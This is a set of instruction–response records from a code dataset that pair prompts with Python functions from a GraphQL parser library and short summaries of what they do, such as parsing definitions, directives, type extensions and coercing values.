{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef parse_executable_definition(lexer: Lexer) -> ExecutableDefinitionNode:\n    if peek(lexer, TokenKind.NAME):\n        func = _parse_executable_definition_functions.get(cast(str, lexer.token.value))\n        if func:\n            return func(lexer)\n    elif peek(lexer, TokenKind.BRACE_L):\n        return parse_operation_definition(lexer)\n    raise unexpected(lexer)", "response": "Parse an executable definition."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nparse an operation definition.", "response": "def parse_operation_definition(lexer: Lexer) -> OperationDefinitionNode:\n    \"\"\"OperationDefinition\"\"\"\n    start = lexer.token\n    if peek(lexer, TokenKind.BRACE_L):\n        return OperationDefinitionNode(\n            operation=OperationType.QUERY,\n            name=None,\n            variable_definitions=[],\n            directives=[],\n            selection_set=parse_selection_set(lexer),\n            loc=loc(lexer, start),\n        )\n    operation = parse_operation_type(lexer)\n    name = parse_name(lexer) if peek(lexer, TokenKind.NAME) else None\n    return OperationDefinitionNode(\n        operation=operation,\n        name=name,\n        variable_definitions=parse_variable_definitions(lexer),\n        directives=parse_directives(lexer, False),\n        selection_set=parse_selection_set(lexer),\n        loc=loc(lexer, start),\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nparses an operation type from the input stream.", "response": "def parse_operation_type(lexer: Lexer) -> OperationType:\n    \"\"\"OperationType: one of query mutation subscription\"\"\"\n    operation_token = expect_token(lexer, TokenKind.NAME)\n    try:\n        return OperationType(operation_token.value)\n    except ValueError:\n        raise unexpected(lexer, operation_token)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef parse_variable_definitions(lexer: Lexer) -> List[VariableDefinitionNode]:\n    return (\n        cast(\n            List[VariableDefinitionNode],\n            many_nodes(\n                lexer, TokenKind.PAREN_L, parse_variable_definition, TokenKind.PAREN_R\n            ),\n        )\n        if peek(lexer, TokenKind.PAREN_L)\n        else []\n    )", "response": "Parse the variable definitions."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef parse_variable_definition(lexer: Lexer) -> VariableDefinitionNode:\n    start = lexer.token\n    return VariableDefinitionNode(\n        variable=parse_variable(lexer),\n        type=expect_token(lexer, TokenKind.COLON) and parse_type_reference(lexer),\n        default_value=parse_value_literal(lexer, True)\n        if expect_optional_token(lexer, TokenKind.EQUALS)\n        else None,\n        directives=parse_directives(lexer, True),\n        loc=loc(lexer, start),\n    )", "response": "Parse a variable definition."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nparses a SelectionSet node.", "response": "def parse_selection_set(lexer: Lexer) -> SelectionSetNode:\n    \"\"\"SelectionSet: {Selection+}\"\"\"\n    start = lexer.token\n    return SelectionSetNode(\n        selections=many_nodes(\n            lexer, TokenKind.BRACE_L, parse_selection, TokenKind.BRACE_R\n        ),\n        loc=loc(lexer, start),\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef parse_selection(lexer: Lexer) -> SelectionNode:\n    return (parse_fragment if peek(lexer, TokenKind.SPREAD) else parse_field)(lexer)", "response": "Parse a selection node."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef parse_field(lexer: Lexer) -> FieldNode:\n    start = lexer.token\n    name_or_alias = parse_name(lexer)\n    if expect_optional_token(lexer, TokenKind.COLON):\n        alias: Optional[NameNode] = name_or_alias\n        name = parse_name(lexer)\n    else:\n        alias = None\n        name = name_or_alias\n    return FieldNode(\n        alias=alias,\n        name=name,\n        arguments=parse_arguments(lexer, False),\n        directives=parse_directives(lexer, False),\n        selection_set=parse_selection_set(lexer)\n        if peek(lexer, TokenKind.BRACE_L)\n        else None,\n        loc=loc(lexer, start),\n    )", "response": "Parses a field from the given lexer."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef parse_arguments(lexer: Lexer, is_const: bool) -> List[ArgumentNode]:\n    item = parse_const_argument if is_const else parse_argument\n    return (\n        cast(\n            List[ArgumentNode],\n            many_nodes(lexer, TokenKind.PAREN_L, item, TokenKind.PAREN_R),\n        )\n        if peek(lexer, TokenKind.PAREN_L)\n        else []\n    )", "response": "Parse the arguments of the current language."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef parse_argument(lexer: Lexer) -> ArgumentNode:\n    start = lexer.token\n    name = parse_name(lexer)\n\n    expect_token(lexer, TokenKind.COLON)\n    return ArgumentNode(\n        name=name, value=parse_value_literal(lexer, False), loc=loc(lexer, start)\n    )", "response": "Argument: Name : Value"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef parse_const_argument(lexer: Lexer) -> ArgumentNode:\n    start = lexer.token\n    return ArgumentNode(\n        name=parse_name(lexer),\n        value=expect_token(lexer, TokenKind.COLON) and parse_const_value(lexer),\n        loc=loc(lexer, start),\n    )", "response": "Parse an argument from a const value."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncorresponds to both FragmentSpread and InlineFragment in the spec.", "response": "def parse_fragment(lexer: Lexer) -> Union[FragmentSpreadNode, InlineFragmentNode]:\n    \"\"\"Corresponds to both FragmentSpread and InlineFragment in the spec.\n\n    FragmentSpread: ... FragmentName Directives?\n    InlineFragment: ... TypeCondition? Directives? SelectionSet\n    \"\"\"\n    start = lexer.token\n    expect_token(lexer, TokenKind.SPREAD)\n\n    has_type_condition = expect_optional_keyword(lexer, \"on\")\n    if not has_type_condition and peek(lexer, TokenKind.NAME):\n        return FragmentSpreadNode(\n            name=parse_fragment_name(lexer),\n            directives=parse_directives(lexer, False),\n            loc=loc(lexer, start),\n        )\n    return InlineFragmentNode(\n        type_condition=parse_named_type(lexer) if has_type_condition else None,\n        directives=parse_directives(lexer, False),\n        selection_set=parse_selection_set(lexer),\n        loc=loc(lexer, start),\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nparses a fragment definition.", "response": "def parse_fragment_definition(lexer: Lexer) -> FragmentDefinitionNode:\n    \"\"\"FragmentDefinition\"\"\"\n    start = lexer.token\n    expect_keyword(lexer, \"fragment\")\n    # Experimental support for defining variables within fragments changes the grammar\n    # of FragmentDefinition\n    if lexer.experimental_fragment_variables:\n        return FragmentDefinitionNode(\n            name=parse_fragment_name(lexer),\n            variable_definitions=parse_variable_definitions(lexer),\n            type_condition=parse_type_condition(lexer),\n            directives=parse_directives(lexer, False),\n            selection_set=parse_selection_set(lexer),\n            loc=loc(lexer, start),\n        )\n    return FragmentDefinitionNode(\n        name=parse_fragment_name(lexer),\n        type_condition=parse_type_condition(lexer),\n        directives=parse_directives(lexer, False),\n        selection_set=parse_selection_set(lexer),\n        loc=loc(lexer, start),\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef parse_fragment_name(lexer: Lexer) -> NameNode:\n    if lexer.token.value == \"on\":\n        raise unexpected(lexer)\n    return parse_name(lexer)", "response": "Parse a fragment name."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef parse_list(lexer: Lexer, is_const: bool) -> ListValueNode:\n    start = lexer.token\n    item = parse_const_value if is_const else parse_value_value\n    return ListValueNode(\n        values=any_nodes(lexer, TokenKind.BRACKET_L, item, TokenKind.BRACKET_R),\n        loc=loc(lexer, start),\n    )", "response": "Parse a list value."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nparse an object value.", "response": "def parse_object(lexer: Lexer, is_const: bool) -> ObjectValueNode:\n    \"\"\"ObjectValue[Const]\"\"\"\n    start = lexer.token\n    item = cast(Callable[[Lexer], Node], partial(parse_object_field, is_const=is_const))\n    return ObjectValueNode(\n        fields=any_nodes(lexer, TokenKind.BRACE_L, item, TokenKind.BRACE_R),\n        loc=loc(lexer, start),\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef parse_directives(lexer: Lexer, is_const: bool) -> List[DirectiveNode]:\n    directives: List[DirectiveNode] = []\n    append = directives.append\n    while peek(lexer, TokenKind.AT):\n        append(parse_directive(lexer, is_const))\n    return directives", "response": "Parses the directives in the grammar."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef parse_directive(lexer: Lexer, is_const: bool) -> DirectiveNode:\n    start = lexer.token\n    expect_token(lexer, TokenKind.AT)\n    return DirectiveNode(\n        name=parse_name(lexer),\n        arguments=parse_arguments(lexer, is_const),\n        loc=loc(lexer, start),\n    )", "response": "Parse a Directive node."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nparses a type reference in the current language.", "response": "def parse_type_reference(lexer: Lexer) -> TypeNode:\n    \"\"\"Type: NamedType or ListType or NonNullType\"\"\"\n    start = lexer.token\n    if expect_optional_token(lexer, TokenKind.BRACKET_L):\n        type_ = parse_type_reference(lexer)\n        expect_token(lexer, TokenKind.BRACKET_R)\n        type_ = ListTypeNode(type=type_, loc=loc(lexer, start))\n    else:\n        type_ = parse_named_type(lexer)\n    if expect_optional_token(lexer, TokenKind.BANG):\n        return NonNullTypeNode(type=type_, loc=loc(lexer, start))\n    return type_"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nparse a named type.", "response": "def parse_named_type(lexer: Lexer) -> NamedTypeNode:\n    \"\"\"NamedType: Name\"\"\"\n    start = lexer.token\n    return NamedTypeNode(name=parse_name(lexer), loc=loc(lexer, start))"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nparse a type system definition.", "response": "def parse_type_system_definition(lexer: Lexer) -> TypeSystemDefinitionNode:\n    \"\"\"TypeSystemDefinition\"\"\"\n    # Many definitions begin with a description and require a lookahead.\n    keyword_token = lexer.lookahead() if peek_description(lexer) else lexer.token\n    func = _parse_type_system_definition_functions.get(cast(str, keyword_token.value))\n    if func:\n        return func(lexer)\n    raise unexpected(lexer, keyword_token)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nparses a TypeSystemExtension node.", "response": "def parse_type_system_extension(lexer: Lexer) -> TypeSystemExtensionNode:\n    \"\"\"TypeSystemExtension\"\"\"\n    keyword_token = lexer.lookahead()\n    if keyword_token.kind == TokenKind.NAME:\n        func = _parse_type_extension_functions.get(cast(str, keyword_token.value))\n        if func:\n            return func(lexer)\n    raise unexpected(lexer, keyword_token)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef parse_schema_definition(lexer: Lexer) -> SchemaDefinitionNode:\n    start = lexer.token\n    expect_keyword(lexer, \"schema\")\n    directives = parse_directives(lexer, True)\n    operation_types = many_nodes(\n        lexer, TokenKind.BRACE_L, parse_operation_type_definition, TokenKind.BRACE_R\n    )\n    return SchemaDefinitionNode(\n        directives=directives, operation_types=operation_types, loc=loc(lexer, start)\n    )", "response": "Parse a schema definition."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nparsing an operation type definition.", "response": "def parse_operation_type_definition(lexer: Lexer) -> OperationTypeDefinitionNode:\n    \"\"\"OperationTypeDefinition: OperationType : NamedType\"\"\"\n    start = lexer.token\n    operation = parse_operation_type(lexer)\n    expect_token(lexer, TokenKind.COLON)\n    type_ = parse_named_type(lexer)\n    return OperationTypeDefinitionNode(\n        operation=operation, type=type_, loc=loc(lexer, start)\n    )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef parse_scalar_type_definition(lexer: Lexer) -> ScalarTypeDefinitionNode:\n    start = lexer.token\n    description = parse_description(lexer)\n    expect_keyword(lexer, \"scalar\")\n    name = parse_name(lexer)\n    directives = parse_directives(lexer, True)\n    return ScalarTypeDefinitionNode(\n        description=description, name=name, directives=directives, loc=loc(lexer, start)\n    )", "response": "Parse a scalar type definition."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef parse_object_type_definition(lexer: Lexer) -> ObjectTypeDefinitionNode:\n    start = lexer.token\n    description = parse_description(lexer)\n    expect_keyword(lexer, \"type\")\n    name = parse_name(lexer)\n    interfaces = parse_implements_interfaces(lexer)\n    directives = parse_directives(lexer, True)\n    fields = parse_fields_definition(lexer)\n    return ObjectTypeDefinitionNode(\n        description=description,\n        name=name,\n        interfaces=interfaces,\n        directives=directives,\n        fields=fields,\n        loc=loc(lexer, start),\n    )", "response": "Parse an object type definition."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef parse_implements_interfaces(lexer: Lexer) -> List[NamedTypeNode]:\n    types: List[NamedTypeNode] = []\n    if expect_optional_keyword(lexer, \"implements\"):\n        # optional leading ampersand\n        expect_optional_token(lexer, TokenKind.AMP)\n        append = types.append\n        while True:\n            append(parse_named_type(lexer))\n            if not expect_optional_token(lexer, TokenKind.AMP):\n                break\n    return types", "response": "Parse the implements interfaces."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nparses the Fields Definition AST.", "response": "def parse_fields_definition(lexer: Lexer) -> List[FieldDefinitionNode]:\n    \"\"\"FieldsDefinition: {FieldDefinition+}\"\"\"\n    return (\n        cast(\n            List[FieldDefinitionNode],\n            many_nodes(\n                lexer, TokenKind.BRACE_L, parse_field_definition, TokenKind.BRACE_R\n            ),\n        )\n        if peek(lexer, TokenKind.BRACE_L)\n        else []\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef parse_field_definition(lexer: Lexer) -> FieldDefinitionNode:\n    start = lexer.token\n    description = parse_description(lexer)\n    name = parse_name(lexer)\n    args = parse_argument_defs(lexer)\n    expect_token(lexer, TokenKind.COLON)\n    type_ = parse_type_reference(lexer)\n    directives = parse_directives(lexer, True)\n    return FieldDefinitionNode(\n        description=description,\n        name=name,\n        arguments=args,\n        type=type_,\n        directives=directives,\n        loc=loc(lexer, start),\n    )", "response": "Parse a field definition node."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef parse_argument_defs(lexer: Lexer) -> List[InputValueDefinitionNode]:\n    return (\n        cast(\n            List[InputValueDefinitionNode],\n            many_nodes(\n                lexer, TokenKind.PAREN_L, parse_input_value_def, TokenKind.PAREN_R\n            ),\n        )\n        if peek(lexer, TokenKind.PAREN_L)\n        else []\n    )", "response": "Parse the argument definitions."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nparses an input value definition node.", "response": "def parse_input_value_def(lexer: Lexer) -> InputValueDefinitionNode:\n    \"\"\"InputValueDefinition\"\"\"\n    start = lexer.token\n    description = parse_description(lexer)\n    name = parse_name(lexer)\n    expect_token(lexer, TokenKind.COLON)\n    type_ = parse_type_reference(lexer)\n    default_value = (\n        parse_const_value(lexer)\n        if expect_optional_token(lexer, TokenKind.EQUALS)\n        else None\n    )\n    directives = parse_directives(lexer, True)\n    return InputValueDefinitionNode(\n        description=description,\n        name=name,\n        type=type_,\n        default_value=default_value,\n        directives=directives,\n        loc=loc(lexer, start),\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef parse_interface_type_definition(lexer: Lexer) -> InterfaceTypeDefinitionNode:\n    start = lexer.token\n    description = parse_description(lexer)\n    expect_keyword(lexer, \"interface\")\n    name = parse_name(lexer)\n    directives = parse_directives(lexer, True)\n    fields = parse_fields_definition(lexer)\n    return InterfaceTypeDefinitionNode(\n        description=description,\n        name=name,\n        directives=directives,\n        fields=fields,\n        loc=loc(lexer, start),\n    )", "response": "Parse an interface type definition."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef parse_union_type_definition(lexer: Lexer) -> UnionTypeDefinitionNode:\n    start = lexer.token\n    description = parse_description(lexer)\n    expect_keyword(lexer, \"union\")\n    name = parse_name(lexer)\n    directives = parse_directives(lexer, True)\n    types = parse_union_member_types(lexer)\n    return UnionTypeDefinitionNode(\n        description=description,\n        name=name,\n        directives=directives,\n        types=types,\n        loc=loc(lexer, start),\n    )", "response": "Parse a union type definition."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef parse_union_member_types(lexer: Lexer) -> List[NamedTypeNode]:\n    types: List[NamedTypeNode] = []\n    if expect_optional_token(lexer, TokenKind.EQUALS):\n        # optional leading pipe\n        expect_optional_token(lexer, TokenKind.PIPE)\n        append = types.append\n        while True:\n            append(parse_named_type(lexer))\n            if not expect_optional_token(lexer, TokenKind.PIPE):\n                break\n    return types", "response": "Parse the union member types."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nparsing an enum type definition.", "response": "def parse_enum_type_definition(lexer: Lexer) -> EnumTypeDefinitionNode:\n    \"\"\"UnionTypeDefinition\"\"\"\n    start = lexer.token\n    description = parse_description(lexer)\n    expect_keyword(lexer, \"enum\")\n    name = parse_name(lexer)\n    directives = parse_directives(lexer, True)\n    values = parse_enum_values_definition(lexer)\n    return EnumTypeDefinitionNode(\n        description=description,\n        name=name,\n        directives=directives,\n        values=values,\n        loc=loc(lexer, start),\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nparses an enumeration value definition.", "response": "def parse_enum_values_definition(lexer: Lexer) -> List[EnumValueDefinitionNode]:\n    \"\"\"EnumValuesDefinition: {EnumValueDefinition+}\"\"\"\n    return (\n        cast(\n            List[EnumValueDefinitionNode],\n            many_nodes(\n                lexer, TokenKind.BRACE_L, parse_enum_value_definition, TokenKind.BRACE_R\n            ),\n        )\n        if peek(lexer, TokenKind.BRACE_L)\n        else []\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nparses an enum value definition.", "response": "def parse_enum_value_definition(lexer: Lexer) -> EnumValueDefinitionNode:\n    \"\"\"EnumValueDefinition: Description? EnumValue Directives[Const]?\"\"\"\n    start = lexer.token\n    description = parse_description(lexer)\n    name = parse_name(lexer)\n    directives = parse_directives(lexer, True)\n    return EnumValueDefinitionNode(\n        description=description, name=name, directives=directives, loc=loc(lexer, start)\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef parse_input_object_type_definition(lexer: Lexer) -> InputObjectTypeDefinitionNode:\n    start = lexer.token\n    description = parse_description(lexer)\n    expect_keyword(lexer, \"input\")\n    name = parse_name(lexer)\n    directives = parse_directives(lexer, True)\n    fields = parse_input_fields_definition(lexer)\n    return InputObjectTypeDefinitionNode(\n        description=description,\n        name=name,\n        directives=directives,\n        fields=fields,\n        loc=loc(lexer, start),\n    )", "response": "Parse an input object type definition."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef parse_input_fields_definition(lexer: Lexer) -> List[InputValueDefinitionNode]:\n    return (\n        cast(\n            List[InputValueDefinitionNode],\n            many_nodes(\n                lexer, TokenKind.BRACE_L, parse_input_value_def, TokenKind.BRACE_R\n            ),\n        )\n        if peek(lexer, TokenKind.BRACE_L)\n        else []\n    )", "response": "Parse the input fields definition."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nparsing a schema extension.", "response": "def parse_schema_extension(lexer: Lexer) -> SchemaExtensionNode:\n    \"\"\"SchemaExtension\"\"\"\n    start = lexer.token\n    expect_keyword(lexer, \"extend\")\n    expect_keyword(lexer, \"schema\")\n    directives = parse_directives(lexer, True)\n    operation_types = (\n        many_nodes(\n            lexer, TokenKind.BRACE_L, parse_operation_type_definition, TokenKind.BRACE_R\n        )\n        if peek(lexer, TokenKind.BRACE_L)\n        else []\n    )\n    if not directives and not operation_types:\n        raise unexpected(lexer)\n    return SchemaExtensionNode(\n        directives=directives, operation_types=operation_types, loc=loc(lexer, start)\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nparse a scalar type extension.", "response": "def parse_scalar_type_extension(lexer: Lexer) -> ScalarTypeExtensionNode:\n    \"\"\"ScalarTypeExtension\"\"\"\n    start = lexer.token\n    expect_keyword(lexer, \"extend\")\n    expect_keyword(lexer, \"scalar\")\n    name = parse_name(lexer)\n    directives = parse_directives(lexer, True)\n    if not directives:\n        raise unexpected(lexer)\n    return ScalarTypeExtensionNode(\n        name=name, directives=directives, loc=loc(lexer, start)\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef parse_object_type_extension(lexer: Lexer) -> ObjectTypeExtensionNode:\n    start = lexer.token\n    expect_keyword(lexer, \"extend\")\n    expect_keyword(lexer, \"type\")\n    name = parse_name(lexer)\n    interfaces = parse_implements_interfaces(lexer)\n    directives = parse_directives(lexer, True)\n    fields = parse_fields_definition(lexer)\n    if not (interfaces or directives or fields):\n        raise unexpected(lexer)\n    return ObjectTypeExtensionNode(\n        name=name,\n        interfaces=interfaces,\n        directives=directives,\n        fields=fields,\n        loc=loc(lexer, start),\n    )", "response": "Parse an object type extension."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef parse_interface_type_extension(lexer: Lexer) -> InterfaceTypeExtensionNode:\n    start = lexer.token\n    expect_keyword(lexer, \"extend\")\n    expect_keyword(lexer, \"interface\")\n    name = parse_name(lexer)\n    directives = parse_directives(lexer, True)\n    fields = parse_fields_definition(lexer)\n    if not (directives or fields):\n        raise unexpected(lexer)\n    return InterfaceTypeExtensionNode(\n        name=name, directives=directives, fields=fields, loc=loc(lexer, start)\n    )", "response": "Parse an interface type extension."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nparses a union type extension.", "response": "def parse_union_type_extension(lexer: Lexer) -> UnionTypeExtensionNode:\n    \"\"\"UnionTypeExtension\"\"\"\n    start = lexer.token\n    expect_keyword(lexer, \"extend\")\n    expect_keyword(lexer, \"union\")\n    name = parse_name(lexer)\n    directives = parse_directives(lexer, True)\n    types = parse_union_member_types(lexer)\n    if not (directives or types):\n        raise unexpected(lexer)\n    return UnionTypeExtensionNode(\n        name=name, directives=directives, types=types, loc=loc(lexer, start)\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef parse_enum_type_extension(lexer: Lexer) -> EnumTypeExtensionNode:\n    start = lexer.token\n    expect_keyword(lexer, \"extend\")\n    expect_keyword(lexer, \"enum\")\n    name = parse_name(lexer)\n    directives = parse_directives(lexer, True)\n    values = parse_enum_values_definition(lexer)\n    if not (directives or values):\n        raise unexpected(lexer)\n    return EnumTypeExtensionNode(\n        name=name, directives=directives, values=values, loc=loc(lexer, start)\n    )", "response": "Parse an enum type extension."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nparses an input object type extension.", "response": "def parse_input_object_type_extension(lexer: Lexer) -> InputObjectTypeExtensionNode:\n    \"\"\"InputObjectTypeExtension\"\"\"\n    start = lexer.token\n    expect_keyword(lexer, \"extend\")\n    expect_keyword(lexer, \"input\")\n    name = parse_name(lexer)\n    directives = parse_directives(lexer, True)\n    fields = parse_input_fields_definition(lexer)\n    if not (directives or fields):\n        raise unexpected(lexer)\n    return InputObjectTypeExtensionNode(\n        name=name, directives=directives, fields=fields, loc=loc(lexer, start)\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nparses a DirectiveDefinition node.", "response": "def parse_directive_definition(lexer: Lexer) -> DirectiveDefinitionNode:\n    \"\"\"InputObjectTypeExtension\"\"\"\n    start = lexer.token\n    description = parse_description(lexer)\n    expect_keyword(lexer, \"directive\")\n    expect_token(lexer, TokenKind.AT)\n    name = parse_name(lexer)\n    args = parse_argument_defs(lexer)\n    expect_keyword(lexer, \"on\")\n    locations = parse_directive_locations(lexer)\n    return DirectiveDefinitionNode(\n        description=description,\n        name=name,\n        arguments=args,\n        locations=locations,\n        loc=loc(lexer, start),\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nparses the directive locations.", "response": "def parse_directive_locations(lexer: Lexer) -> List[NameNode]:\n    \"\"\"DirectiveLocations\"\"\"\n    # optional leading pipe\n    expect_optional_token(lexer, TokenKind.PIPE)\n    locations: List[NameNode] = []\n    append = locations.append\n    while True:\n        append(parse_directive_location(lexer))\n        if not expect_optional_token(lexer, TokenKind.PIPE):\n            break\n    return locations"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nparsing a DirectiveLocation node.", "response": "def parse_directive_location(lexer: Lexer) -> NameNode:\n    \"\"\"DirectiveLocation\"\"\"\n    start = lexer.token\n    name = parse_name(lexer)\n    if name.value in DirectiveLocation.__members__:\n        return name\n    raise unexpected(lexer, start)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef loc(lexer: Lexer, start_token: Token) -> Optional[Location]:\n    if not lexer.no_location:\n        end_token = lexer.last_token\n        source = lexer.source\n        return Location(\n            start_token.start, end_token.end, start_token, end_token, source\n        )\n    return None", "response": "Return a location object."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef expect_token(lexer: Lexer, kind: TokenKind) -> Token:\n    token = lexer.token\n    if token.kind == kind:\n        lexer.advance()\n        return token\n\n    raise GraphQLSyntaxError(\n        lexer.source, token.start, f\"Expected {kind.value}, found {token.kind.value}\"\n    )", "response": "Expect the next token to be of the given kind."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nexpect the next token optionally to be of the given kind.", "response": "def expect_optional_token(lexer: Lexer, kind: TokenKind) -> Optional[Token]:\n    \"\"\"Expect the next token optionally to be of the given kind.\n\n    If the next token is of the given kind, return that token after advancing the lexer.\n    Otherwise, do not change the parser state and return None.\n    \"\"\"\n    token = lexer.token\n    if token.kind == kind:\n        lexer.advance()\n        return token\n\n    return None"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef expect_keyword(lexer: Lexer, value: str) -> Token:\n    token = lexer.token\n    if token.kind == TokenKind.NAME and token.value == value:\n        lexer.advance()\n        return token\n\n    raise GraphQLSyntaxError(\n        lexer.source, token.start, f\"Expected {value!r}, found {token.desc}\"\n    )", "response": "Expect the next token to be a given keyword."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef expect_optional_keyword(lexer: Lexer, value: str) -> Optional[Token]:\n    token = lexer.token\n    if token.kind == TokenKind.NAME and token.value == value:\n        lexer.advance()\n        return token\n\n    return None", "response": "Expect the next token optionally to be a given keyword."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef unexpected(lexer: Lexer, at_token: Token = None) -> GraphQLError:\n    token = at_token or lexer.token\n    return GraphQLSyntaxError(lexer.source, token.start, f\"Unexpected {token.desc}\")", "response": "Create an error when an unexpected lexed token is encountered."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef many_nodes(\n    lexer: Lexer,\n    open_kind: TokenKind,\n    parse_fn: Callable[[Lexer], Node],\n    close_kind: TokenKind,\n) -> List[Node]:\n    \"\"\"Fetch matching nodes, at least one.\n\n    Returns a non-empty list of parse nodes, determined by the `parse_fn`.\n    This list begins with a lex token of `open_kind` and ends with a lex token of\n    `close_kind`. Advances the parser to the next lex token after the closing token.\n    \"\"\"\n    expect_token(lexer, open_kind)\n    nodes = [parse_fn(lexer)]\n    append = nodes.append\n    while not expect_optional_token(lexer, close_kind):\n        append(parse_fn(lexer))\n    return nodes", "response": "Fetch matching nodes at least one."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef coerce_value(\n    value: Any, type_: GraphQLInputType, blame_node: Node = None, path: Path = None\n) -> CoercedValue:\n    \"\"\"Coerce a Python value given a GraphQL Type.\n\n    Returns either a value which is valid for the provided type or a list of encountered\n    coercion errors.\n    \"\"\"\n    # A value must be provided if the type is non-null.\n    if is_non_null_type(type_):\n        if value is None or value is INVALID:\n            return of_errors(\n                [\n                    coercion_error(\n                        f\"Expected non-nullable type {type_} not to be null\",\n                        blame_node,\n                        path,\n                    )\n                ]\n            )\n        type_ = cast(GraphQLNonNull, type_)\n        return coerce_value(value, type_.of_type, blame_node, path)\n\n    if value is None or value is INVALID:\n        # Explicitly return the value null.\n        return of_value(None)\n\n    if is_scalar_type(type_):\n        # Scalars determine if a value is valid via `parse_value()`, which can throw to\n        # indicate failure. If it throws, maintain a reference to the original error.\n        type_ = cast(GraphQLScalarType, type_)\n        try:\n            parse_result = type_.parse_value(value)\n            if is_invalid(parse_result):\n                return of_errors(\n                    [coercion_error(f\"Expected type {type_.name}\", blame_node, path)]\n                )\n            return of_value(parse_result)\n        except (TypeError, ValueError) as error:\n            return of_errors(\n                [\n                    coercion_error(\n                        f\"Expected type {type_.name}\",\n                        blame_node,\n                        path,\n                        str(error),\n                        error,\n                    )\n                ]\n            )\n\n    if is_enum_type(type_):\n        type_ = cast(GraphQLEnumType, type_)\n        values = type_.values\n        if isinstance(value, str):\n            enum_value = values.get(value)\n            if enum_value:\n                return of_value(value if enum_value.value is None else enum_value.value)\n        suggestions = suggestion_list(str(value), values)\n        did_you_mean = f\"did you mean {or_list(suggestions)}?\" if suggestions else None\n        return of_errors(\n            [\n                coercion_error(\n                    f\"Expected type {type_.name}\", blame_node, path, did_you_mean\n                )\n            ]\n        )\n\n    if is_list_type(type_):\n        type_ = cast(GraphQLList, type_)\n        item_type = type_.of_type\n        if isinstance(value, Iterable) and not isinstance(value, str):\n            errors = None\n            coerced_value_list: List[Any] = []\n            append_item = coerced_value_list.append\n            for index, item_value in enumerate(value):\n                coerced_item = coerce_value(\n                    item_value, item_type, blame_node, at_path(path, index)\n                )\n                if coerced_item.errors:\n                    errors = add(errors, *coerced_item.errors)\n                elif not errors:\n                    append_item(coerced_item.value)\n            return 